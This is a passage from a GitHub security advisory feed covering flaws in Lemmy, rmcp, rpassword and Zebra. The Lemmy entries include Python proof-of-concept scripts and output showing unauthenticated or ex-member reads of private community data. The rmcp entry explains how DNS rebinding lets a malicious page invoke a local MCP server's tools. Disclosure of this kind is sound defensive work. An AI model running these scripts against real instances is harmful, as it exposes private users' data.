community_id = community["id"]
post = req("POST", "/post", admin, name="secret post " + suffix,
           community_id=community_id, body=secret + " post body").json()["post_view"]["post"]
post_id = post["id"]

show("Bob reads private community metadata", req("GET", "/community", bob, params={"id": community_id}), secret)
show("Bob direct post read control", req("GET", "/post", bob, params={"id": post_id}), secret)

req("POST", "/community/follow", alice, community_id=community_id, follow=True)
req("POST", "/community/pending_follows/approve", admin,
    community_id=community_id, follower_id=alice_id, approve=True)
req("PUT", "/post/save", alice, post_id=post_id, save=True)
req("POST", "/post/like", alice, post_id=post_id, is_upvote=True)
req("POST", "/community/follow", alice, community_id=community_id, follow=False)

show("Alice direct post read after leaving", req("GET", "/post", alice, params={"id": post_id}), secret)
show("Alice saved list after leaving", req("GET", "/account/saved", alice), secret)
show("Alice liked list after leaving", req("GET", "/account/liked", alice), secret)

mod_comm = req("POST", "/community", admin,
               name="modlog" + suffix,
               title="Private Modlog " + suffix,
               sidebar=secret + " modlog sidebar",
               summary=secret + " modlog summary",
               visibility="private").json()["community_view"]["community"]
mod_post = req("POST", "/post", admin, name=secret + " removed post",
               community_id=mod_comm["id"], body="body").json()["post_view"]["post"]
req("POST", "/post/remove", admin, post_id=mod_post["id"], removed=True, reason="poc")
show("Unauthenticated modlog", req("GET", "/modlog", params={"listing_type": "all", "limit": 50}), secret)
</code></pre>
<p>Output:</p>
<pre><code class="language-text">Bob reads private community metadata: HTTP 200
contains marker: True
Bob direct post read control: HTTP 404
contains marker: False
Alice direct post read after leaving: HTTP 404
contains marker: False
Alice saved list after leaving: HTTP 200
contains marker: True
Alice liked list after leaving: HTTP 200
contains marker: True
Unauthenticated modlog: HTTP 200
contains marker: True
</code></pre>
<h2 id="impact">Impact</h2>
<p>Bob can read private community descriptions and sidebars before a moderator approves him. Alice can leave a private community, or a moderator can remove her, and Lemmy still returns private post bodies that Alice saved or liked while she was a member. An unauthenticated visitor can use the public modlog to discover private community metadata and removed private post names.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Apply the same private-community filter used by <code>PostView</code> and <code>CommentView</code> to <code>CommunityView::read()</code>, <code>CommunityQuery::list()</code>, <code>PersonSavedCombinedQuery::list()</code>, <code>PersonLikedCombinedQuery::list()</code>, and the <code>ListingType::All</code> branch of the modlog query. Admins and accepted followers should keep access. Other callers should receive the same <code>404</code> behavior as <code>GET /post</code> and <code>GET /comment</code>.</p>
<hr>
<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/LemmyNet/lemmy/security/advisories/GHSA-95q8-x6r6-672m">https://github.com/LemmyNet/lemmy/security/advisories/GHSA-95q8-x6r6-672m</a></li>
<li><a href="https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d">https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d</a></li>
<li><a href="https://github.com/advisories/GHSA-95q8-x6r6-672m">https://github.com/advisories/GHSA-95q8-x6r6-672m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-95q8-x6r6-672m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T22:22:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lemmy_api] Private Lemmy instances expose multi-community metadata without authentication]]></title>
        <id>https://github.com/advisories/GHSA-jmxc-hhwx-gvv3</id>
        <link href="https://github.com/advisories/GHSA-jmxc-hhwx-gvv3"/>
        <updated>2026-05-06T22:12:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>read_multi_community()</code> does not enforce the private-instance setting. On a private instance, an unauthenticated visitor can read multi-community names, titles, summaries, sidebars, owner identities, and member community lists.</p>
<h2 id="details">Details</h2>
<p>Other read handlers load <code>local_site</code> and call <code>check_private_instance()</code> before returning data to unauthenticated callers. <code>read_multi_community()</code> does not call that helper:</p>
<pre><code class="language-rust">pub async fn read_multi_community(
  Query(data): Query&lt;GetMultiCommunity&gt;,
  context: Data&lt;LemmyContext&gt;,
  local_user_view: Option&lt;LocalUserView&gt;,
) -&gt; LemmyResult&lt;Json&lt;GetMultiCommunityResponse&gt;&gt; {
  let my_person_id = local_user_view.as_ref().map(|l| l.person.id);
  let id = resolve_multi_community_identifier(&amp;data.name, data.id, &amp;context, &amp;local_user_view)
    .await?
    .ok_or(LemmyErrorType::NoIdGiven)?;
  let multi_community_view =
    MultiCommunityView::read(&amp;mut context.pool(), id, my_person_id).await?;
</code></pre>
<p><code>get_community()</code>, <code>list_posts()</code>, <code>list_comments()</code>, <code>read_person()</code>, <code>search()</code>, and <code>resolve_object()</code> all enforce the private-instance guard.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The script creates a multi-community whose metadata contains a marker, turns on <code>private_instance</code>, confirms a guarded control endpoint blocks unauthenticated callers, then reads the same multi-community over <code>GET /multi_community</code> without authentication.</p>
<pre><code class="language-python">#!/usr/bin/env python3
import json, random, string
import requests

BASE       = "http://127.0.0.1:8536/api/v4"
ADMIN_USER = "lemmy"
ADMIN_PASS = "lemmylemmy"

def api(method, path, token=None, **kw):
    h = kw.pop("headers", {})
    if token: h["Authorization"] = "Bearer " + token
    return requests.request(method, BASE + path, headers=h, **kw)

suffix = "multi" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
secret = "SECRET_MULTI_" + suffix

admin = api("POST", "/account/auth/login", json={"username_or_email": ADMIN_USER, "password": ADMIN_PASS}).json()["jwt"]

# Create a multi-community whose title/summary/sidebar embed the marker.
mid = api("POST", "/multi_community", admin, json={
    "name": "m" + suffix, "title": secret,
    "summary": secret + " summary", "sidebar": secret + " sidebar",
}).json()["multi_community_view"]["multi"]["id"]

# Enable private_instance.
api("PUT", "/site", admin, json={"private_instance": True})

print("private_instance:", api("GET", "/site").json()["site_view"]["local_site"]["private_instance"])

# Control: a comparable read endpoint correctly rejects unauthenticated callers.
control = api("GET", "/community/list")
print("unauth /community/list (control):", control.status_code, control.text[:120])

# Leak: read_multi_community returns the private metadata to an unauthenticated caller.
leak = api("GET", "/multi_community", params={"id": mid})
print("unauth /multi_community:", leak.status_code, leak.text[:300])
print("contains secret:", secret in leak.text)
</code></pre>
<p>Output:</p>
<pre><code class="language-text">private_instance: True
unauth /community/list (control): 400 {"error":"instance_is_private","cause":"InstanceIsPrivate"}
unauth /multi_community: 200 {"multi_community_view":{"multi":{"title":"SECRET_MULTI_multijwxokm","summary":"SECRET_MULTI_multijwxokm summary","sidebar":"SECRET_MULTI_multijwxokm sidebar"}}}
contains secret: True
</code></pre>
<p>The control request shows the privacy setting is active. The multi-community endpoint still returns the private metadata.</p>
<h2 id="impact">Impact</h2>
<p>An unauthenticated visitor can read multi-community metadata from an instance whose admin configured the site as private. The exposed fields include names, titles, summaries, sidebars, owner identities, and member community lists.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Load <code>local_site</code> at the start of <code>read_multi_community()</code> and call <code>check_private_instance(&amp;local_user_view, &amp;local_site)?</code> before resolving or reading the multi-community.</p>
<hr>
<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/LemmyNet/lemmy/security/advisories/GHSA-jmxc-hhwx-gvv3">https://github.com/LemmyNet/lemmy/security/advisories/GHSA-jmxc-hhwx-gvv3</a></li>
<li><a href="https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d">https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d</a></li>
<li><a href="https://github.com/advisories/GHSA-jmxc-hhwx-gvv3">https://github.com/advisories/GHSA-jmxc-hhwx-gvv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmxc-hhwx-gvv3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T22:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rmcp] rmcp Streamable HTTP server transport has a DNS rebinding vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-89vp-x53w-74fx</id>
        <link href="https://github.com/advisories/GHSA-89vp-x53w-74fx"/>
        <updated>2026-05-06T21:55:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Prior to version 1.4.0, the <code>rmcp</code> crate's Streamable HTTP server transport (<code>crates/rmcp/src/transport/streamable_http_server/</code>) did not validate the incoming <code>Host</code> header. This allowed a malicious public website, via a DNS rebinding attack, to send authenticated requests to an MCP server running on the victim's loopback or private-network interface — violating the MCP specification's <a href="https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#security-warning">transport security guidance</a>.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who convinces a victim to visit a malicious page can:</p>
<ul>
<li>Enumerate and invoke any tool exposed by a locally-running rmcp-based MCP server.</li>
<li>Read resources, prompts, and any state accessible via the MCP session.</li>
<li>Trigger side effects (file writes, shell execution, API calls, etc.) limited only by what tools the victim's server exposes.</li>
</ul>
<p>Because MCP servers frequently run with the user's privileges and expose developer tooling (filesystems, shells, browser control, language servers, etc.), the practical impact can extend to arbitrary code execution on the victim's machine.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><code>rmcp &lt; 1.4.0</code> — all prior releases of the Streamable HTTP server transport. Non-HTTP transports (stdio, child-process) are not affected.</p>
<h2 id="patched-versions">Patched Versions</h2>
<p><code>rmcp &gt;= 1.4.0</code> (current: 1.5.1).</p>
<h2 id="patch">Patch</h2>
<p>Fixed in <a href="https://github.com/modelcontextprotocol/rust-sdk/pull/764">PR #764</a> (commit <code>8e22aa2</code>), released as v1.4.0 on 2026-04-09:</p>
<ul>
<li><code>StreamableHttpServerConfig::allowed_hosts</code> now defaults to a loopback-only allowlist: <code>["localhost", "127.0.0.1", "::1"]</code>.</li>
<li>All incoming HTTP requests pass through <code>validate_dns_rebinding_headers()</code>, which parses the <code>Host</code> header and returns HTTP 403 if the host is not on the allowlist.</li>
<li>Public deployments can configure an explicit allowlist via <code>StreamableHttpService::with_allowed_hosts(...)</code>, or opt out (not recommended without an upstream reverse proxy that validates <code>Host</code>) via <code>disable_allowed_hosts()</code>.</li>
</ul>
<p>This fix validates the <code>Host</code> header only. <code>Origin</code> header validation is tracked as a defense-in-depth follow-up in <a href="https://github.com/modelcontextprotocol/rust-sdk/issues/822">#822</a> and is not required to block the DNS rebinding attack described here — the browser cannot forge the Host header sent to the rebound server.</p>
<h2 id="workarounds-for-unpatched-users">Workarounds for Unpatched Users</h2>
<ul>
<li>Upgrade to <code>rmcp &gt;= 1.4.0</code>.</li>
<li>If upgrade is not possible, place the MCP server behind a reverse proxy (e.g. nginx, Caddy) configured to reject requests whose <code>Host</code> header is not one of your expected hostnames.</li>
<li>Do not bind the MCP server to <code>0.0.0.0</code> without such a proxy.</li>
</ul>
<h2 id="resources">Resources</h2>
<ul>
<li>PR: <a href="https://github.com/modelcontextprotocol/rust-sdk/pull/764">https://github.com/modelcontextprotocol/rust-sdk/pull/764</a></li>
<li>Issue: <a href="https://github.com/modelcontextprotocol/rust-sdk/issues/815">https://github.com/modelcontextprotocol/rust-sdk/issues/815</a></li>
<li>Follow-up (Origin validation): <a href="https://github.com/modelcontextprotocol/rust-sdk/issues/822">https://github.com/modelcontextprotocol/rust-sdk/issues/822</a></li>
<li>MCP transport security guidance: <a href="https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#security-warning">https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#security-warning</a></li>
</ul>
<h2 id="related-advisories-same-class-of-vulnerability">Related advisories (same class of vulnerability)</h2>
<ul>
<li>TypeScript SDK: GHSA-w48q-cv73-mx4w</li>
<li>Python SDK: GHSA-9h52-p55h-vw2f</li>
<li>Go SDK: GHSA-xw59-hvm2-8pj6</li>
<li>Java SDK: GHSA-8jxr-pr72-r468</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/modelcontextprotocol/rust-sdk/security/advisories/GHSA-89vp-x53w-74fx">https://github.com/modelcontextprotocol/rust-sdk/security/advisories/GHSA-89vp-x53w-74fx</a></li>
<li><a href="https://github.com/modelcontextprotocol/rust-sdk/issues/815">https://github.com/modelcontextprotocol/rust-sdk/issues/815</a></li>
<li><a href="https://github.com/modelcontextprotocol/rust-sdk/pull/764">https://github.com/modelcontextprotocol/rust-sdk/pull/764</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#security-warning">https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#security-warning</a></li>
<li><a href="https://github.com/advisories/GHSA-89vp-x53w-74fx">https://github.com/advisories/GHSA-89vp-x53w-74fx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-89vp-x53w-74fx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T21:55:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rpassword] rpassword affected by partial password reveal when input is interrupted ]]></title>
        <id>https://github.com/advisories/GHSA-2p6r-x3vv-xqm2</id>
        <link href="https://github.com/advisories/GHSA-2p6r-x3vv-xqm2"/>
        <updated>2026-05-06T21:49:34.000Z</updated>
        <content type="html"><![CDATA[<p>rpassword maintainers were made aware of a possible issue with a partial password reveal when input is interrupted.</p>
<p>To quote @squell:</p>
<blockquote>
<p>@conradkleinespel I've confirmed this problem with SequoiaPGP, which I think uses rpassword, e.g.:</p>
<p>Suppose we use pkill -9 sq in a different terminal right after the password has been typed in:</p>
<p>$ sq key generate --userid "barf" --with-password
Enter password to protect the key: Killed
$ hello^C</p>
<p>Where the password I typed in is "hello".</p>
</blockquote>
<p>This has been fixed in version v7.5.0 and above.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/conradkleinespel/rpassword/security/advisories/GHSA-2p6r-x3vv-xqm2">https://github.com/conradkleinespel/rpassword/security/advisories/GHSA-2p6r-x3vv-xqm2</a></li>
<li><a href="https://github.com/conradkleinespel/rpassword/releases/tag/v7.5.0">https://github.com/conradkleinespel/rpassword/releases/tag/v7.5.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2p6r-x3vv-xqm2">https://github.com/advisories/GHSA-2p6r-x3vv-xqm2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2p6r-x3vv-xqm2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-06T21:49:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zebra-script] Zebra Vulnerable to Consensus Divergence in Transparent Sighash Hash-Type Handling]]></title>
        <id>https://github.com/advisories/GHSA-8m29-fpq5-89jj</id>
        <link href="https://github.com/advisories/GHSA-8m29-fpq5-89jj"/>
        <updated>2026-05-06T20:47:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-2026-41583-consensus-divergence-in-transparent-sighash-hash-type-handling">CVE-2026-41583: Consensus Divergence in Transparent Sighash Hash-Type Handling</h1>
<h2 id="summary">Summary</h2>
<p>After a refactoring, Zebra failed to validate a consensus rule that restricted the possible values of sighash hash types for V5 transactions which were enabled in the NU5 network upgrade. Zebra nodes could thus accept and eventually mine a block that would be considered invalid by zcashd nodes, creating a consensus split between Zebra and zcashd nodes.</p>
<p>In a similar vein, for V4 transactions, Zebra mistakenly used the "canonical" hash type when computing the sighash while zcashd (correctly per the spec) uses the raw value, which could also crate a consensus split.</p>
<h2 id="severity">Severity</h2>
<p><strong>Critical</strong> - This is a Consensus Vulnerability that could allow a malicious party to induce network partitioning, service disruption, and potential double-spend attacks against affected nodes.</p>
<p>Note that the impact is currently alleviated by the fact that currently most miners run <code>zcashd</code>.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p>All Zebra versions prior to version 4.3.1. (Some older versions are not impacted but are no longer supported by the network.)</p>
<h2 id="description">Description</h2>
<p>Verification of transparent transactions inherits the Bitcoin Script verification code in C++. Since it is consensus-critical, this code was called from Zebra through foreign function interface (FFI). That interface was clunky because it required parsing the whole transaction in C++ code, which would then pull Rust libraries which could get in conflict with Zebra code. A refactoring was done so that only the verification itself was done in C++, and the rest done by Rust code, using a callback. However, in this refactoring, it was not noticed that a particular consensus rule - only accepting known hash types in transparent transaction signatures - was being enforced in C++ code and thus had to be enforced by the Rust caller.</p>
<p>An attacker could exploit this by:</p>
<ul>
<li>Submitting a V4 or V5 transaction with an invalid hash type</li>
<li>The V5 transaction would be accepted by Zebra nodes but not by <code>zcashd</code> nodes (and vice-versa for V4), creating a consensus split in the network.</li>
</ul>
<h2 id="impact">Impact</h2>
<p><strong>Consensus Failure</strong></p>
<ul>
<li><strong>Attack Vector:</strong> Network.</li>
<li><strong>Effect:</strong> Network partition/consensus split.</li>
<li><strong>Scope:</strong> Any Zebra affected Zebra node</li>
</ul>
<h2 id="fixed-versions">Fixed Versions</h2>
<p>This issue is fixed in Zebra 4.3.1.</p>
<p>The fix adds the consensus check in the caller of the C++ verification code. It also uses the raw hash type for V4 sighash computations.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Users should upgrade to Zebra 4.3.1 or later immediately.</p>
<p>There are no known workarounds for this issue. Immediate upgrade is the only way to ensure the node remains on the correct consensus path and is protected against malicious chain forks.</p>
<h2 id="credits">Credits</h2>
<p>Thanks Alex “Scalar” Sol for finding and reporting the issue, and to @sangsoo-osec who independently found the same issue and demonstrated that the V4 variant was also exploitable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ZcashFoundation/zebra/security/advisories/GHSA-8m29-fpq5-89jj">https://github.com/ZcashFoundation/zebra/security/advisories/GHSA-8m29-fpq5-89jj</a></li>
<li><a href="https://github.com/ZcashFoundation/zebra/commit/1f605eca5c55e3b65229fa01a97d9aa84fd37447">https://github.com/ZcashFoundation/zebra/commit/1f605eca5c55e3b65229fa01a97d9aa84fd37447</a></li>
<li><a href="https://github.com/advisories/GHSA-8m29-fpq5-89jj">https://github.com/advisories/GHSA-8m29-fpq5-89jj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m29-fpq5-89jj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-18T01:15:24.000Z</published>
    </entry>
</feed>